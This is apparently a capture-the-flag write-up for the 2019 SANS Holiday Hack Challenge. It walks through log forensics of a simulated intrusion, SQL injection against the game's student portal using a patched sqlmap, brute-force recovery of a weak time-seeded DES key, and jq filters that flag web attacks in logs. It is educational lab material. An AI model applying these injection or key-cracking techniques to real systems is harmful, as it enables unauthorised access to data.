8Ia8LiZEwvyZr2WO \\pagebreak Objective 9 - Retrieve Scraps of Paper from Server \u00b6 Inspirational Quote \"If you need answer, talk to a rubber duck!\" -kaknowles Objective Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix. Difficulty Level: 4 Links Student Portal Related Video Graylog - Terminal Challenge \u00b6 Elf Name Pepper Minstix Pre-Solve Hints Graylog Docs , (Events and Sysmon) Post-Solve Hints Sqlmap Tamper Scripts , SQL Injection from OWASP Objective Kringlecon 2 - Graylog - Terminal Challenge You read the Graylog Docs. You start the terminal challenge and login with credential elfustudent/elfustudent . You use various search parameters to find the answers to the questions. Kringlecon 2 - Graylog Incident Response Report - Terminal Challenge Graylog - Solution \u00b6 Answer: ElfU Graylog Incident Response Report Graylog Login: elfustudent/elfustudent. Question 1: Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. What is the full-path + filename of the first malicious file downloaded by Minty? Answer: C:\\Users\\minty\\Downloads\\cookie_recipe.exe Hint: We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. We can use regular expressions to include or exclude patterns: TargetFilename:/.+\\.pdf/ Question 2: The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first? Answer: 192.168.247.175:4444 Hint: We can pivot off the answer to our first question using the binary path as our ProcessImage Question 3: What was the first command executed by the attacker? (answer is a single word) Answer: C:\\Windows\\system32\\cmd.exe /c \"whoami \" Hint: Since all commands (sysmon event id 1) by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp. Search: \"ParentProcessCommandLine:/.*cookie_recipe.*/\" Question 4: What is the one-word service name the attacker used to escalate privileges? Answer: webexservice Hint: Continuing on using the cookie_reciper.exe binary as our ParentProcessImage, we should see some more commands later on related to a service. Question 5: What is the file-path + filename of the binary ran by the attacker to dump credentials? Answer: C:\\cookie.exe Hint: The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search. Question 6: The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine? Answer: alabaster Hint:Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. Search: EventID:4624 AND SourceNetworkAddress:192.168.247.175 Question 7: What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine? Answer Answer: 06:04:28 Hint: LogonType 10 is used for successful network connections using the RDP client. Search: EventID:4624 AND SourceNetworkAddress:192.168.247.175 Question 8: The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv) Answer: ELFU-RES-WKS2,elfu-res-wks3,3 Search: ventID:4624 AND SourceHostName:ELFU\\-RES\\-WKS2 Hint:The attacker has GUI access to workstation 2 via RDP. They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3. Question 9: What is the full-path + filename of the secret research document after being transferred from the third host to the second host? Answer: C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf Hints: Search EventID:2 AND source:elfu\\-res\\-wks2 AND NOT TargetFilename:/.+AppData.+/ We can look for sysmon file creation event id of 2 with a source of workstation 2. We can also use regex to filter out overly common file paths using something like: AND NOT TargetFilename:/.+AppData.+/ Question 10: What is the IPv4 address (as found in logs) the secret research document was exfiltrated to? Answer: 104.22.3.84 Hint: We can look for the original document in CommandLine using regex. When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of https://pastebin.com/post.php. We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com. Search: pastebin.com Kringlecon 2 - Report Submission Message from Pepper Ministix after solving the challenge: Kringlecon 2 - Graylog Incident Response Report - Terminal Challenge Objective 9 - Walkthrough \u00b6 You read the hints that were provided from solving the last terminal challenge. You look at the student portal. Kringlecon 2 - Check Application Status You try a simple SQL injection 'email@domain.com to ese if the website is vulnerable to SQL injection. Kringlecon 2 - SQL injection After reviewing the webpage you notice that the CSRF validaitor url is https://studentportal.elfu.org/validator.php You download SQLMAP. You use the following configs: url = https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&token= method = get csrfToken = token csrfUrl = https://studentportal.elfu.org/validator.php csrfMethod = GET verbose = 6 You run SQLMAP with -dump. You get an error message that it's unable to find the CSRF token. You search github to see where this error is coming from. You notice this error is coming from connect.py file around line 1110. Kringlecon 2 - Interesting table You review the code and add 3 lines to \"FIX\" the code. print ( \"page:\" + str ( page )) token . name = \"token\" token . value = str ( page ) . replace ( \"=\" , \"%3D\" ) Kringlecon 2 - connect.py \"FIX\" You re-run SQLMAP with -dump. Kringlecon 2 - SQLMAP Running. SQLMAP finds a database that has 6 image uids. Kringlecon 2 - Interesting table Kringlecon 2 - SQLMAP completed. You download the 6 images that you found in the table. Kringlecon 2 - 0f5f510e.png Kringlecon 2 - 1cc7e121.png Kringlecon 2 - 439f15e6.png Kringlecon 2 - 667d6896.png Kringlecon 2 - adb798ca.png Kringlecon 2 - ba417715.png You make out the name of Santa's cutting-edge sleigh guidance system on the edges of the scrapes. Objective 9 - Solution \u00b6 Answer: Super sled-o-matic \\pagebreak Objective 10 - Recover Cleartext Document \u00b6 Inspirational Quote \"Solve objectives to unravel the mystery of the universe .\" - Ed Skoudis Objective The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words) For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen. Difficulty Level: 5 Links Elfscrow Crypto , debug symbols , encrypted document Related Video Ron Bowes, Reversing Crypto the Easy Way Mongo Pilfer - Terminal Challenge \u00b6 Elf Name Holly Evergreen Pre-Solve Hints MongoDB Documentation Post-Solve Hints Reversing Crypto the Easy Way Objective Kringlecon 2 - Holy Evergreen - Terminal Challenge Kringlecon 2 - Mongo Pilfer - Terminal Challenge You read the hint provided by Holly Evergreen. You open the Mongo Pilfer terminal. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You run mongo and receive this error message. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You notice Mongo is not running on a default port. You look around and find a file in the root go.sh . Kringlecon 2 - cat /go.sh This file shows that mongo is running on port 12121. You run mongo localhost:12121 to connect to the mongo server. Kringlecon 2 - Mongo Pilfer - Terminal Challenge You run show dbs to get a list of databases. You switch to elfu database. You list the collections show collections . You run the action find on collection solution . You run the command that is displayed from the above command. Kringlecon 2 - Mongo Pilfer - Terminal Challenge Kringlecon 2 - Mongo Pilfer - Terminal Challenge Mongo Pilfer - Solution \u00b6 Answer: mongo localhost:12121 db.loadServerScripts();displaySolution(); Message from Holly Evergreen after solving the challenge: Kringlecon 2 - Mongo Pilfer - Terminal Challenge Objective 10 - Walkthrough \u00b6 You watch the Reversing Crypto the Easy Way. You run elfscrow.exe in a sandbox and encrypt a test document. You notice each time the document is encrypted it is providing a different escrow key. You start by downloading and installing the free version of IDA. You download the symbols provided in the challenge. You open elfscrow.exe in IDA and load the symbols. You navigate to generate_key function. You notice the function is calling the time. After the time function has been called it's calling the super_secure_srand function. Kringlecon 2 - Ida Generate_key function You google the time function and notice that it returns the time in epoch. Kringlecon 2 - time function You write a python program to output time in epoch. import time i = 1 while i < 100 : seconds = int ( time . time ()) print ( \"Seed =\" , seconds ) i += 1 You run elfscrow.exe at the same time as the python script and confirm that elfscrow.exe is using is time() as the Seed. Kringlecon 2 - Elfscrow.exe From earlier, you know this seed is likely passed to super_secure_srand function. You review super_secure_srand . Kringlecon 2 - super_secure_srand function You see a few constant in this function, ex. 2531011 . You search Google for this constant. You find a Fastrand() function that uses the same constants. Kringlecon 2 - Fastrand() You remember the video talked about how to create a generate_key function. Kringlecon 2 - Screenshot from the talk Using the video as a guide, you write the generate_key() function. def generate_key ( seed ): key = \"\" for i in range ( 8 ): seed = ( 214013 * seed + 2531011 ) key += chr ((( seed >> 16 ) & 0x7fff ) & 0x0ff ) return key While reviewing the code, you find that the encryption is likely DES-CBC. Kringlecon 2 - DES-CBC key You test decrypting the file you encrypted on CyberChef . Kringlecon 2 - Decrypt the file encrypted by elfscrow.exe The objective states the file was encrypted on December 6, 2019, between 7pm and 9pm UTC. You convert the time to epoch time. Kringlecon 2 - epoch time December 6, 2019, 7 PM Kringlecon 2 - epoch time December 6, 2019, 9 PM You know the key is between 1575658800 and 1575666000. You write a For loop around generate_key() function to generate all the keys. You output all the keys to a keys.txt . You download CyberChef API from github. You write a wrapper in Javascript to open keys.txt and decrypt it using CyberChef framework. You use the DES-CBC to decrypt the ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc with all possible keys. You output the decrypted files to a folder with the key that was used to decrypt it as the filename. {% highlight JavaScript linenos %} // app.js const chef = require(\"cyberchef\"); var readline = require('readline'); const fs = require('fs'); let file = fs.readFileSync(\"ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc\"); console.log(file) ; var myInterface = readline.createInterface({ input: fs.createReadStream('keys.txt') }); var lineno = 0; myInterface.on('line', function (line) { lineno++; console.log('Line number ' + lineno + ': ' + line.trim()); try { var results = chef.DESDecrypt(file,{ Key:{string:line.trim(), option:\"Hex\"}, IV:{string:\"0000000000000000\", option:\"Hex\"}, Mode: \"CBC\", Input:\"Raw\", Output:\"Raw\"},).toString(); // console.log(results); fs.writeFileSync('./files/'.concat(line.trim()), results, \"binary\",(err) => { // throws an error, you could also catch it here if (err) throw err; // success case, the file was saved console.log('Lyric saved!'); }); results = '' } catch(err) { } }); {% endhighlight JavaScript %} You run the JavaScript file and wait until it has decrypted the file with all possible keys. Once completed, you run the command grep -rl \"%PDF\" to find the decrypted file that has a PDF header. Kringlecon 2 - The only decrypted file with the \"%PDF\" header The key used to encrypt the file is b5ad6a321240fbec . You open the decrypted file. Kringlecon 2 - Document decrypted You notice an interesting section in the file that may come handy later. Kringlecon 2 - Document decrypted Objective 10 - Solution \u00b6 Answer: Machine Learning Sleigh Route Finder \\pagebreak Objective 11 - Open the Sleigh Shop Door \u00b6 Inspirational Quote \"You must learn to say 'no'\" -hacks4pancake Objective Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny? For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth. Difficulty Level: 5 Links Crate Related Video Smart Braces - Terminal Challenge \u00b6 Elf Name Kent Tinseltooth Pre-Solve Hints Iptables Post-Solve Hints Chrome Dev Tools Objective Kringlecon 2 - Kent Tinseltooth - Terminal Challenge You open the console and see the following messages: Kringlecon 2 - Smart Braces - Terminal Challenge You read IOTteethBraces.md. Kringlecon 2 - IOTteethBraces.md This is a timed challenge. If you take too long to solve the challenge, you're greeted with the following message: Kringlecon 2 - Kent Tinseltooth - Terminal Challenge You read the hint for this challenge and write the IP tables for the challenge. Kringlecon 2 - Kent Tinseltooth - Terminal Challenge Smart Braces - Solution \u00b6 Answer: sudo iptables -F sudo iptables -P FORWARD DROP sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A INPUT -p tcp -s 172.19.0.255 --dport 22 -j ACCEPT sudo iptables -A INPUT -p tcp --match multiport --dport 21,80 -j ACCEPT sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -i lo -j ACCEPT Message from Kent Tinseltooth after solving the challenge: Kringlecon 2 - Kent Tinseltooth - Terminal Challenge Objective 11 - Walkthrough \u00b6 You visit Shinny Upatree and are greeted with this message: Kringlecon 2 - Shinny Upatree When you visit crate website, you're greeted with a number of locks that you have to open. Each lock provides hint(s) for opening the lock. Lock 1 \u00b6 You open the chrome developer tools and see a code 62ID5140 . You type this code in lock 1 and it unlocks. Kringlecon 2 - Lock 1 Lock 2 \u00b6 You proceed to lock 2. Kringlecon 2 - Lock 2 You view the source code for lock 2 and see the code 5U7A9BBX . Kringlecon 2 - Lock 2 Source Code Kringlecon 2 - Lock 2 - Print Preview Lock 3 \u00b6 You proceed to lock 3. Kringlecon 2 - Lock 3 You view the Network response in chrome developer tools. Kringlecon 2 - Lock 3 - Network response You load the .png file that you see in network response. Kringlecon 2 - Lock 3 - png You type the code in lock 3 to unlock it. Kringlecon 2 - Lock 3 - Solved Lock 4 \u00b6 You proceed to lock 4. Kringlecon 2 - Lock 4 You go to Application tab in chrome developer tools and expand Local Stroage under Storage . Kringlecon 2 - Lock 4 - Local Storage You type the code to unlock lock 4. Kringlecon 2 - Lock 4 - Solved Lock 5 \u00b6 You proceed to Lock 5. Kringlecon 2 - Lock 5 The hint says to view the title on the html page. You view the title. Kringlecon 2 - Lock 5 - html You type the code in lock 5 to unlock it. Kringlecon 2 - Lock 5 - Solved Lock 6 \u00b6 You proceed to Lock 6. Kringlecon 2 - Lock 6 You view the .css file and update the perspective variable. Kringlecon 2 - Lock 6 - .css The code becomes visible. Kringlecon 2 - Lock 6 - .css You type the code in the lock. Lock 7 \u00b6 You proceed to Lock 7. Kringlecon 2 - Lock 7 You view the font-family in the html file and see QCIAX2SW Kringlecon 2 - Lock 7 - font-family html You type the code to unlock lock 7. Lock 8 \u00b6 You proceed to Lock 8 Kringlecon 2 - Lock 8 Kringlecon 2 - Lock 8 - Code analysiss You create a button .egg and get the event listener. Kringlecon 2 - Lock 8 - Event Listener You enter VERONICA into the lock to unlock it. Lock 9 \u00b6 You proceed to lock 9. Kringlecon 2 - Lock 9 You set the chakra's in the code to active. You see that the code appears above the instructions. Kringlecon 2 - Lock 9 You type the code into the lock to unlock. Kringlecon 2 - Lock 9 - Solved Lock 10 \u00b6 You proceed to lock 10. Kringlecon 2 - Lock 10 You view the code for the lock. Kringlecon 2 - Lock 10 - Code You remove the \"cover\" . Kringlecon 2 - Lock 10 - Remove Cover Kringlecon 2 - Lock 10 When you try to type a code the lock, an error appears in the console that it's missing a macaroni. You search the code for macaroni and find this. Kringlecon 2 - Lock 10 - macaroni You look at the .css and find that there is a mac.png, qtip.png and gnome.png. Kringlecon 2 - Lock 10 - png, qtip.png and gnome.png You look for gnome in the code. Kringlecon 2 - Lock 10 - gnome You find swab in the code. Kringlecon 2 - Lock 10 - swab/qtip You copy the three components to the lock 10 code. Kringlecon 2 - Lock 10 - Fix circuit board Kringlecon 2 - Lock 10 - Fixed lock You zoom into the side of the circuit board to find the code to unlock the lock K029XJ37 . Kringlecon 2 - Lock 10 - code You're greeted by this message once you unlock lock 10. Kringlecon 2 - Lock 10 - code Objective 11 - Solution \u00b6 Answer: Lock 1: 62ID5140 Lock 2: 5U7A9BBX Lock 3: FZUNIJFD Lock 4: H0UHDN8S Lock 5: ZW5698HD Lock 6: SRB40Q5Q Lock 7: QCIAX2SW Lock 8: VERONICA Lock 9: 0QIMRKYC Lock 10: K029XJ37 The villian is The Tooth Fairy. \\pagebreak Objective 12 - Filter Out Poisoned Sources of Weather Data \u00b6 Inspirational Quote \"A Nerarious, villainous, Evil attacker is the worst of attacker you can have.\" -Ed Skoudis Objective Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae. Difficulty Level: 4 Links Zeek JSON logs , Block the 100 offending sources of information to guide Santa's sleigh Related Video Zeek JSON Analysis - Terminal Challenge \u00b6 Elf Name Wunorse Openslae Pre-Solve Hints Parsing Zeek JSON Logs with JQ Post-Solve Hints Do you see any LFI , XSS , Shellshock , or SQLi ? Objective Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You read the instructions for jq. You open the terminal console. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You use jq to find the longest durations. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You modify the query to display the host and destinations. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You modify the query to sort by duration and get the last item of the list. Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge You run the runtoanswer and type in 13.107.21.200 . Kringlecon 2 - Zeek JSON Analysis - Terminal Challenge Zeek JSON Analysis - Solution \u00b6 Answer: 13.107.21.200 Message from Wunorse Openslae after solving the challenge: Kringlecon 2 - Wunorse Openslae - Terminal Challenge Objective 12 - Walkthrough \u00b6 You download zeek logs. We need to find the credentials to login to the website. You use JQ to filter out the noise and view successful connections. jq '.[] | select (.uri | contains (\"weather?station\") | not) | select (.status_code == 200) | .uri' http.log | sort |uniq Kringlecon 2 - Filter out the noise using JQ You see a file name README.md . You remember the document you decrypted in an earlier challenge, referred to default credentials being stored in README.md . You access srf.elfu.org/README.md . Kringlecon 2 - README.md You login srf.elfu.org with the default login. Kringlecon 2 - srf login page The welcome page once you login to srf . Kringlecon 2 - srf welcome page You review the Firewall instructions on how to block and allow IPs. Kringlecon 2 - Firewall Instructions You use JQ and the hints to find some of the bad IPs: jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host , \"\\n\"' http.log | grep -E \\' > blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | awk '/\\/\\.\\./' >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep -E \"\\.\\.\" >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep -E \\/\\.\\% >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep pass >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\> >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\& >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | grep \\| >> blah.csv jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | awk '/\\;\\s*\\}/' >> blah.csv From the above queries you get 78 Bad IPs. You know there is about 100 bad IPs. You export all the events to a .csv file. jq -j '.[] | .[\"id.orig_h\"], \", \",.[\"user_agent\"],\", \", .uri, \", \",.username, \", \",.password, \", \",.host, \"\\n\"' http.log | > all.csv You open all.csv in excel and look at the data. Kringlecon 2 - Pivot table on the User-Agent You use vlookup to get the user-agent count for each of the IP's user-agents. You filter on user-agent count that are low. You filter out the IPs that are already in your bad IP list. Kringlecon 2 - Filter by user-agents that have low hits. You get about 39 new IPs. 103.235.93.133 118.26.57.38 44.164.136.41 249.237.77.152 203.68.29.5 10.122.158.57 187.152.203.243 50.154.111.0 217.132.156.225 252.122.243.212 29.0.183.220 22.34.153.164 66.116.147.181 126.102.12.53 31.116.232.143 250.22.86.40 140.60.154.239 226.102.56.13 42.127.244.30 104.179.109.113 42.103.246.130 42.103.246.130 42.103.246.130 42.103.246.130 185.19.7.133 42.16.149.112 158.171.84.209 34.155.174.167 249.90.116.138 231.179.108.238 92.213.148.0 97.220.93.190 87.195.80.126 53.160.218.44 253.65.40.39 226.240.188.154 148.146.134.52 142.128.135.10 37.216.249.50 You combine the bad IPs. Here is a list of bad IPs: 42.103.246.250,49.161.8.58,84.147.231.129,2.230.60.70,10.155.246.29,225.191.220.138,75.73.228.192,249.34.9.16,27.88.56.114,238.143.78.114,121.7.186.163,106.132.195.153,129.121.121.48,190.245.228.38,34.129.179.28,135.32.99.116,2.240.116.254,45.239.232.245,33.132.98.193,84.185.44.166,254.140.181.172,150.50.77.238,68.115.251.76,118.196.230.170,173.37.160.150,81.14.204.154,135.203.243.43,186.28.46.179,13.39.153.254,111.81.145.191,0.216.249.31,220.132.33.81,83.0.8.119,150.45.133.97,229.229.189.246,227.110.45.126,123.127.233.97,80.244.147.207,200.75.228.240,230.246.50.221,223.149.180.133,187.178.169.123,116.116.98.205,102.143.16.184,52.39.201.107,131.186.145.73,253.182.102.55,1.185.21.112,229.133.163.235,194.143.151.224,23.49.177.78,75.215.214.65,211.229.3.254,250.51.219.47,180.57.20.247,9.206.212.33,79.198.89.109,25.80.197.172,193.228.194.36,169.242.54.5,28.169.41.122,233.74.78.199,132.45.187.177,56.5.47.137,19.235.69.221,69.221.145.150,42.191.112.181,48.66.193.176,44.74.106.131,106.93.213.219,31.254.228.4,61.110.82.125,65.153.114.120,95.166.116.45,168.66.108.62,139.45.221.220,96.156.113.98,170.51.98.223,103.235.93.133,118.26.57.38,44.164.136.41,249.237.77.152,203.68.29.5,10.122.158.57,187.152.203.243,50.154.111.0,217.132.156.225,252.122.243.212,29.0.183.220,22.34.153.164,66.116.147.181,126.102.12.53,31.116.232.143,250.22.86.40,140.60.154.239,226.102.56.13,42.127.244.30,104.179.109.113,42.103.246.130,185.19.7.133,42.16.149.112,158.171.84.209,34.155.174.167,249.90.116.138,231.179.108.238,92.213.148.0,97.220.93.190,87.195.80.126,53.160.218.44,253.65.40.39,226.240.188.154,148.146.134.52,142.128.135.10,37.216.249.50 You block the IPs on the firewall. Kringlecon 2 - Block bad IPs in firewall Objective 12 - Solution \u00b6 Answer: Route Calculation Success! RID:0807198508261964 Message from Tooth Fairy after solving the challenge: Kringlecon 2 - Tooth Fairy response \\pagebreak Conclusion \u00b6 Once you solve the challenge, the bell tower door opens up. Kringlecon 2 - Bell Tower Access You go up the ladder to the bell tower. Kringlecon 2 - Bell Tower Access You open the letter in the corner of the room. Kringlecon 2 - Bell Tower You talk to Santa. Kringlecon 2 - Santa You talk to Tooth Fairy. Kringlecon 2 - Tooth Fairy You talk to Krampus. Kringlecon 2 - Krampus The narrative of the story line: Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"KringleCon 2"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#introduction","text":"Every year around the holidays SAN releases their CTF Holiday Hack challenge. These Holiday Hack challenges consists of a story and a mystery that revolve around the holidays and Santa. As a player, you get to interact with a 2D world and work on solving challenges. Solving these challenges help players unravel the mystery of the holidays. As a result the players are put in a though spot to help Santa and save christmas. This year's challenge is located at Elf university. There are 12 main objectives to solve in this year's challenge. The objectives have varying difficulty level, from 1 to 5 (easiest to hardest). The players can receive hints for the main objectives by solving mini challenges called terminal challenges. As players solve each objective and terminal challenge, they receive badges. As part of the holiday hack challenge, SANs releases a number of educational videos that may be helpful for solving the objectives. This write-up will provide a walkthrough of the Holiday Hack Challenge. It includes a walkthrough of each objectives and terminal challenge. It will also provide inspiring quotes, hints and strategies on solving future challenges. Links: Holiday Hack Challenge 2019 Free Album KringleCon 2019 Videos","title":"Introduction"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#protips","text":"Kringlecon 2 - What You Can Do My strategy for tackling each objective is as follow: - Solve the Terminal Challenges - Watch all the Videos - Tackle the Objective - Document and take screenshots as progressing through the game. A tip from John Hammond to hold predominance over the universe: Kringlecon 2 - The Infinity Stone Step The Pwn step is a function for the domain that you're trying to achieve predominance. It's a multidimensional thing. There is a good series of tips by Katie Knowles in this conference. They can be watched here . Here is some keypoints of this talk: Know your what and how! Kringlecon 2 - How to Hack How to Hack! Kringlecon 2 - How to Hack The problem spiral, which in some ways is the pwn step of the infinity stone step: Kringlecon 2 - How to Hack! Read this book! Kringlecon 2 - Read this book before bed.","title":"Protips"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#holiday-hack-challenge-logo","text":"If you're not feeling warm and fuzzy yet with your hot chocolate, don't worry you'll get there. This year's logo looked interesting. Lets take a look at the logo. Kringlecon 2 - ELF University Logo There is latin on the logo Ille Te videt dum dormit . Using google translator, it gives two different possible translation: Ille Te videt dum dormit = We see him while he sleeps Ille Te videt = He sees you dum dormit = while sleeping Then there is this all seeing eye on the logo. Kringlecon 2 - Santa's All Seeing Eye? Here are some of the rejected Logos: Kringlecon 2 - 'rejected-elfu-logos.txt' Hopefully you're feeling warm and fuzzy by now. Lets start the Holiday hack challenge! \\pagebreak","title":"Holiday Hack Challenge Logo"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-0-talk-to-santa-in-the-quad","text":"Inspirational Quote \"A positive attitude will help you and the world.\" -hacks4pancake Objective Enter the campus quad and talk to Santa. Difficulty Level: 0 Links n/a Related Video Lesley Carhart, Over 90,000: Ups and Downs of my InfoSec Twitter Journey","title":"Objective 0 - Talk to Santa in the Quad"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-0-walkthrough","text":"As you enter the game you're greeted by Santa. He has the following message for you: Kringlecon 2 - Santa at Entrance Kringlecon 2 - Santa's Message As you explore and enter the campus quad, you find Santa waiting there. Kringlecon 2 - Santa in Campus","title":"Objective 0 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-0-solution","text":"Answer: Talk to Santa in Campus. He has the following message for you which starts the game: Kringlecon 2 - Storyline \\pagebreak","title":"Objective 0 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-1-find-the-turtle-doves","text":"Inspirational Quote \"In our hacker community, we're all family.\" -John Hammond Objective Find the missing turtle doves. Difficulty Level: 0 Links n/a Related Video John Hammond, 5 Steps to Build and Lead a Team of Holly Jolly Hackers","title":"Objective 1 - Find the Turtle Doves"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-1-walkthrough","text":"As you walk and explore the campus you get to see the different areas you have access to. Once you explore the student union, you will find the solution to this challenge.","title":"Objective 1 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-1-solution","text":"Answer: Dove's are in the student union by the fireplace. Kringlecon 2 - Michael and Jane - Two Turtle Doves Very important message from the Doves: Kringlecon 2 - Message from the Doves \\pagebreak","title":"Objective 1 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-2-unredact-threatening-document","text":"Inspirational Quote \"Pull That Thread.\" -Good Elf Objective Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad. Difficulty Level: 1 Links LetterToElfUPersonnel.pdf Related Video Heather Mahalik, When Malware Goes Mobile, Quick Detection is Critical","title":"Objective 2 - Unredact Threatening Document"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-2-walkthrough","text":"As you walk around the quad and explore you find the following document in north west corner of the quad. Kringlecon 2 - LetterToElfUPersonnel.pdf As you open the document and examine it, you notice that you can highlight everything in the document. Kringlecon 2 - LetterToElfUPersonnel.pdf content You select everything and press 'CTRL-C' to copy everything. You paste the content in a text editor to view the message: Kringlecon 2 - LetterToElfUPersonnel.pdf content","title":"Objective 2 - Walkthrough"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-2-solution","text":"Answer: DEMAND \\pagebreak","title":"Objective 2 - Solution"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#objective-3-windows-log-analysis-evaluate-attack-outcome","text":"Inspirational Quote \" Roads? Logs? Where we're going we don't need Roads Logs.\" -Mark Baggett Objective We're seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. Difficulty Level: 1 Links Security.evtx.zip Related Video Mark Baggett, Logs? Where we're going we don't need logs Tools SRUM-DUMP , ESE2CSV","title":"Objective 3 - Windows Log Analysis: Evaluate Attack Outcome"},{"location":"posts/2020/kringlecon2/2020-01-13-KringleCon2/#escape-ed-terminal-challenge","text":"Elf Name Bushy Evergreen Pre-Solve Hints ed Editor Basics Post-Solve Hints Deep Blue CLI Posting , Deep Blue CLI on Github Objective Kringlecon 2 - Escape Ed - Terminal Challenge After you read the ed Editor Basics you find the solution for this terminal challenge. Kringlecon 2 - Escape Ed - Terminal 